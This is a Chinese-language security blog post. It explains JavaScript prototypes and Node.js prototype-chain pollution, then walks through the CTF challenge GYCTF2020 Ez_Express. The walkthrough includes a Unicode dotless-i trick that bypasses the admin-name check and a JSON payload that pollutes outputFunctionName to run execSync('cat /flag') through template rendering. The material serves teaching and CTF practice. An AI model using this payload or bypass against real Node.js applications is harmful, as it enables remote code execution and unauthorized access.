#  由浅入深理解Nodejs原型链污染漏洞   
原创 ye1s  山石网科安全技术研究院   2024-06-07 14:49  
  
原型链污染是Nodejs应用程序中的一种安全漏洞，通过修改JavaScript对象的原型链来篡改应用程序的行为。这种漏洞可能导致恶意代码执行、绕过访问控制或泄露敏感数据等严重后果。  
  
**1、 原型和原型链**  
## JavaScript没有父类和子类这个概念，也没有类和实例的区分，而JavaScript中的继承关系则是靠一种很奇怪的“原型链”模式来实现继承。  
##  1.1JavaScript 对象  
  
在JavaScript中几乎所有的事物都是对象，如下代码：  
```
var a = {
    "name": "HoKong",
    "pass": "password"
}
console.log(a['name'])
console.log(a.pass)
console.log(a);
```  
  
其中访问对象的属性，可以有两种方式：  
```
a.name;
a["name"];
```  
##     1.2原型的定义  
  
每个对象在JavaScript中都具有一个原型对象。这个原型对象通过对象的内置属性__proto__指向其构造函数的prototype指向的对象。换句话说，每个对象都是由一个构造函数创建的。在JavaScript中，原型是实现继承的基础，JavaScript的继承是基于原型的继承。  
  
如下图所示，在JavaScript中，当声明一个名为A的函数时，浏览器会在内存中创建一个名为B的对象。函数A默认具有一个属性prototype，它指向对象B，即函数A的原型对象，也简称为函数的原型。对象B默认具有一个属性constructor，它指向函数A本身。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53Oibvm3vtOmJ63OFOMKxaia1TQLzrwNl6FZOWHk3Pl4jZFPYzic38LFPRo8w/640?wx_fmt=png&from=appmsg "")  
  
如下图所示，在JavaScript中，每个函数都具有一个prototype属性，该属性指向通过调用该构造函数创建的原型对象。此外，在JavaScript中，每个实例对象（包括函数、数组和普通对象）也都具有一个__proto__属性，用于指向其对应的原型对象（隐式原型）。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53OibTef19OQLrXy8xcxoibqW33f3ePrgloTa9nIibkCOrxNFiclVu5NRPFo1g/640?wx_fmt=png&from=appmsg "")  
  
实例对象的 __proto__与创建该实例对象的构造函数的 prototype 是相等的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53OibcrQ89owlYuaVnBqHa7vZzpibshIbK4elNV8fr0BtQvW1lgaoRDeCkFw/640?wx_fmt=png&from=appmsg "")  
  
**1.3原型链的搜索**  
  
  
原型链是JavaScript中实现继承的方式，通过递归地继承原型对象的原型来实现。在原型链中，顶端是Object的原型。当需要使用或输出一个变量时，首先会在当前层级中搜索相应的变量。如果该变量在当前层级中不存在，就会向上层级搜索，也就是在其父类中搜索。如果在父类中仍然找不到该变量，就会继续向祖父类搜索，直到最终指向null。如果在整个原型链中仍然没有找到该变量，就会返回undefined。  
  
如下图所示，在JavaScript中，当我们想要访问某个属性时，首先会在实例对象（A）本身内部查找该属性。如果在实例对象中没有找到该属性，就会继续在该对象的原型（a.__proto__，即A.prototype）上查找。我们知道，对象的原型也是一个对象，它也有自己的原型。如果在对象的原型上仍然没有找到目标属性，就会继续在对象的原型的原型（A.prototype.__proto__）上查找，依此类推。这个过程一层一层地在原型上进行查找，就形成了原型链。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53OibmbH2rmxiaR1JdBSWO2MGREibicx7aic45D7URQgTosibpyTfB0xh7AUORKA/640?wx_fmt=png&from=appmsg "")  
  
实例对象原型的原型是Object.prototype，而它的原型是null，null 没有原型，所以 Object.prototype 就是原型链的最顶端。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53OibiamlCpTFhyUjQw2cwfzMUfb5vcHFEdUgyEzuQAbk4Ep3axpAf3VCDibA/640?wx_fmt=png&from=appmsg "")  
  
**2、原型链污染**  
  
JavaScript中，可以使用a.b.c或a["b"]["c"]的方式来访问对象的属性。由于对象是无序的，当使用第二种方式访问对象时，只能使用指定的下标进行访问。因此，可以通过a["__proto__"]的方式来访问对象的原型对象。  
  
在一个应用程序中，如果攻击者能够控制并修改对象的原型，就能够影响到所有与该对象同一类、父类或祖先类的对象。这种攻击方式被称为原型链污染。  
  
原型链污染通常发生在对象或数组的键名或属性名可控的情况下，并且发生在赋值语句中。常见的情况包括对象递归合并操作，对象克隆，以及在路径查找属性后修改属性的操作。  
  
如下图例子所示：可以发现一个对象son修改自身的原型的属性的时候会影响到另外一个具有相同原型的对象son1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53OibicQsXIx6oib6pBNGffqia8rUic3CwFdejBptYyuxaVjSLmUVGUoxQfe2HQ/640?wx_fmt=png&from=appmsg "")  
  
**例题分析：[GYCTF2020]Ez_Express**  
  
访问路由/www.zip,可得到源码，接下来对源码进行分析。  
  
源码中用了 merge() 和 clone()，在merge()方法里有对象递归合并操作，可造成原型链污染。  
```
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}
```  
  
往下找到调用 clone() 的位置：  
```
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
```  
  
可见，当登录 admin 用户后，便可以发送 POST 数据来进行原型链污染。但是要污染哪一个参数？继续向下看到 /info 路由。  
```
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
```  
  
看到在 /info 里，将 res 对象中的 outputFunctionName 属性渲染入 index 中，而 outputFunctionName 是未定义的，所以污染 outputFunctionName 属性。  
```
res.outputFunctionName=undefined;
```  
  
但是需要登录admin账号才能用到 clone()，这里又不知其admn账户的密码。先到 /login 路由处分析一下。  
```
router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
```  
  
可以看到注册的用户名不能为 admin，不过有个地方可以注意到：  
```
'user':req.body.userid.toUpperCase(),
```  
  
这里将user给转为大写了，这里可以考虑到JavaScript 大小写特性来绕过。  
  
可以注册一个 admın，此admın非彼admin，仔细看i部分。  
  
注册admın后成功登录admin用户。接下来可以发送 Payload 进行原型链污染。  
```
{"lua":"test","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"},"Submit":""}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTbmGKGF8Oicaf7RwFlia53Oibl0acRWVLWKlib2yIZUibNBMIhWNWk5JCiclZchLW4icYjwboKtjxiaiatoKA/640?wx_fmt=png&from=appmsg "")  
  
然后再访问 /info 路由即可得到flag。  
  
  
